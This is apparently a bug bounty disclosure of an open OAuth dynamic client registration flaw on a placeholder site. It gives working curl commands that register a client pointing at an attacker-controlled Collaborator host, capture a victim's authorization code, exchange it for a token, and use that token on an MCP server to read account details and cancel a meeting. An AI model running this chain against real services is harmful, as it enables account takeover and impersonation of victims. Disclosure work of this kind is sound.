Open OAuth Dynamic Client Registration Allows Authorization Code Interception via Attacker-Controlled Redirect URI

Omar Mesalam • Bug Bounty • Broken Authentication / OAuth Misconfiguration

During my reconnaissance of examble.com I discovered an endpoint at /oauth/register. It allows anyone to register a new OAuth application without any login or verification. The critical issue is that the system does not verify whether the person registering the app actually owns the redirect URI they provide. This allowed me to register a malicious client, hijack the authorization flow, and take over a victim's account through a stolen access token.

AUTH Discovering the Open Registration Endpoint

  • I sent a registration request to /oauth/register using a fake, unowned domain to check whether the server verifies redirect URI ownership
┌──(root㉿omar)-[/home/mesalam] └─# curl -X POST "https://examble.com/oauth/register" \ -H "Content-Type: application/json" \ -d '{"client_name": "test-app", "redirect_uris": ["https://test.com/"]}' {"client_id":"h-KempoHSTjNMTgJp4uky5t4gitRKteJOqcrkL-gX7E","client_name":"test-app","redirect_uris":["https://test.com/"],"scopes":["mcp:scheduling:read","mcp:scheduling:write"],"grant_types":null,"response_types":null,"token_endpoint_auth_method":"none"}
  • A client_id was successfully generated without any authentication header
  • The redirect_uris were returned exactly as submitted, with no verification that the registrant actually owns that domain — direct proof that no ownership check is performed at all
  • The requested scopes (mcp:scheduling:read, mcp:scheduling:write) grant full read and write permissions on any account that authorizes the application
  • token_endpoint_auth_method is set to "none", meaning this is a public client that does not require a client secret when exchanging the authorization code for a token

AUTH Registering a Malicious Client

  • I registered an application using a domain I fully control, so that if anyone authorized the app, the redirect would land on a server under my control, allowing me to intercept the callback
┌──(root㉿omar)-[/home/mesalam] └─# curl -X POST "https://examble.com/oauth/register" \ -H "Content-Type: application/json" \ -d '{"client_name": "test-app", "redirect_uris": ["https://npg2mbz6qkzb2yjbk2ndb2w0krqjee23.oastify.com/"]}' {"client_id":"jIzKAksr30-lZTRoUjfBv--DUi6pwybL2JBKBXX55PE","client_name":"test-app","redirect_uris":["https://npg2mbz6qkzb2yjbk2ndb2w0krqjee23.oastify.com/"],"scopes":["mcp:scheduling:read","mcp:scheduling:write"],"grant_types":null,"response_types":null,"token_endpoint_auth_method":"none"}
  • Registered a new client using a redirect_uri under my control (oastify.com — a Burp Collaborator out-of-band interaction domain)
  • Received a new client_id: jIzKAksr30-lZTRoUjfBv--DUi6pwybL2JBKBXX55PE
  • The scopes remained the same: read and write
  • token_endpoint_auth_method is still set to "none", confirming it is a public client as expected

Preparing the PKCE Challenge

Even though PKCE does not protect against the vulnerability being exploited here, it is still mandatory because the server rejects any /oauth/authorize request without a code_challenge, returning error=invalid_request / error_description=code_challenge is required before the "Allow" page is ever reached. Modern OAuth standards require PKCE on every authorization request for public clients, regardless of intent — so it was generated purely to satisfy the server, not as part of the exploit itself.

┌──(root㉿omar)-[/home/mesalam] └─# CODE_VERIFIER=$(openssl rand -base64 32 | tr -d '=+/' | cut -c1-43) echo "Verifier: $CODE_VERIFIER" Verifier: maqrgwsJ6kQSubxS22rnTYTQp5V9DjexFRrgP9U7hQ ┌──(root㉿omar)-[/home/mesalam] └─# CODE_CHALLENGE=$(echo -n $CODE_VERIFIER | openssl dgst -sha256 -binary | openssl base64 | tr -d '=' | tr '+/' '-_') echo "Challenge: $CODE_CHALLENGE" Challenge: BboeQpJcKt6W4CXOKZnGY7XtMrFoTQ4eF2Zr2gi-kS8

AUTH Hijacking the Authorization Flow

  • I constructed the authorization URL containing the malicious client_id and my attacker-controlled redirect_uri:
https://examble.com/oauth/authorize?client_id=jIzKAksr30-lZTRoUjfBv--DUi6pwybL2JBKBXX55PE&redirect_uri=https://npg2mbz6qkzb2yjbk2ndb2w0krqjee23.oastify.com/&scope=mcp:scheduling:read mcp:scheduling:write&response_type=code&code_challenge=BboeQpJcKt6W4CXOKZnGY7XtMrFoTQ4eF2Zr2gi-kS8&code_challenge_method=S256
  • I opened a separate browser not logged into any account (to simulate the victim) and visited the crafted authorization link
  • The consent page looked completely official, displaying the real logo and matching the site's design language
  • The requested permissions were broad: "View and manage scheduled events", "Retrieve user information", "View and manage organizations"
  • The only warning was a small line before the buttons stating the redirect destination — written in small font at the very bottom, not visually prominent, and easy for most users to miss
  • I clicked Approve to observe exactly what would happen
  • DNS and HTTP requests reached my Collaborator instance
  • The Referer header confirmed the request originated from https://examble.com/, proving this was a genuine redirect after the victim clicked Approve
  • I received the authorization code: code=fl8aamz53QqsLzzI3sKuTq-3WYilJXfgjjOl

AUTH Exchanging the Code for an Access Token

The temporary authorization code cannot be used directly — it must be exchanged at /oauth/token along with the code_verifier. The server then returns a real, working access_token bound to the victim's account, valid for two hours, even though the attacker is the one requesting it.

┌──(root㉿omar)-[/home/mesalam] └─# curl -X POST "https://examble.com/oauth/token" \ -H "Content-Type: application/json" \ -d '{ "grant_type": "authorization_code", "code": "fl8aamz53QqsLzzI3sKuTq-3WYilJXf", "redirect_uri": "https://npg2mbz6qkzb2yjbk2ndb2w0krqjee23.oastify.com/", "client_id": "jIzKAksr30-lZTRoUjfBv--DUi6pwybL2JBKBXX55PE", "code_verifier": "maqrgwsJ6kQSubxS22rnTYTQp5V9DjexFRrgP9U7hQ" }' {"error":"invalid_grant","error_description":"The provided authorization grant is invalid, expired, revoked, does not match the redirection URI used in the authorization request, or was issued to another client."}
  • The first attempt failed — the authorization code issued by the OAuth server has a very short lifetime
┌──(root㉿omar)-[/home/mesalam] └─# curl -X POST "https://examble.com/oauth/token" \ -H "Content-Type: application/json" \ -d '{ "grant_type": "authorization_code", "code": "BXD0qqlfFWLddArS_4uj9LOGK80EIAEvvpbhOCi5KHw", "redirect_uri": "https://npg2mbz6qkzb2yjbk2ndb2w0krqjee23.oastify.com/", "client_id": "jIzKAksr30-lZTRoUjfBv--DUi6pwybL2JBKBXX55PE", "code_verifier": "IeaAWDQfkPLwXcKktHsnZI92iiRv0G7r6P795LBb4w" }' {"access_token":"eyJranDwJOVQe....","token_type":"Bearer","expires_in":7200,"refresh_token":"orFYsexvjpeW-N33QwlmvkS_Ex2J9i70hnTreVFdPHc","scope":"mcp:scheduling:read mcp:scheduling:write","created_at":1789369859,"owner":"https://api.examble.com/users/7f45d44b-e669-4198-bd9e-6ac785d7704b","organization":"https://api.examble.com/organizations/aad6acd5-e3cb-4190-8af9-adc7d6d01555"}
  • This token is a fully functional access key linked to the victim's account — any server accepting it treats the request as if it came directly from the victim
  • With mcp:scheduling:read/write scope, an attacker could view the victim's full profile, event types, and appointments, and could cancel meetings, modify availability, or create scheduling links on their behalf
  • Every action performed with this token is logged as executed by the victim themselves, not the attacker

MCP Using the Stolen Token Against the MCP Server

  • I decoded the token to understand its contents, then performed the required MCP handshake before any other request
curl -X POST "https://mcp.examble.com/" \ -H "Authorization: Bearer ey........" \ -H "Content-Type: application/json" \ -H "Accept: application/json, text/event-stream" \ -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc-client","version":"1.0"}}}'
  • The handshake succeeded, confirming the access token is valid and accepted by examble's MCP server
  • The server responded with its capabilities and instructions, treating the attacker as a legitimate client acting on behalf of the victim's account
  • This means the attacker can now call any available MCP tool with this token: retrieve user info, list event types, list scheduled events, view invitees, and perform write actions such as creating, updating, or canceling events

IMPACT Retrieving the Victim's Account Details

The server returned the victim's account details in full: name, email, scheduling slug, scheduling URL, timezone, and organization URI — confirming valid, authenticated read access to the victim's account through the MCP interface.

IMPACT Booking and Canceling a Meeting on the Victim's Behalf

  • Booking a meeting is a normal, expected action on the platform. What is not normal is that the stolen access token can later be used to cancel that meeting
  • A meeting was booked with "Alpha" as the invitee name (recorded as "New Meeting" in examble's system), and its UUID was retrieved so it could be canceled with the stolen token
  • UUID obtained: c5fbb106-7f70-4341-b0ea-0e91d40b0ca6

{ "canceled_by": "Victim", "reason": null, "canceler_type": "host", "created_at": "2026-09-14T07:44:45.336691Z" }
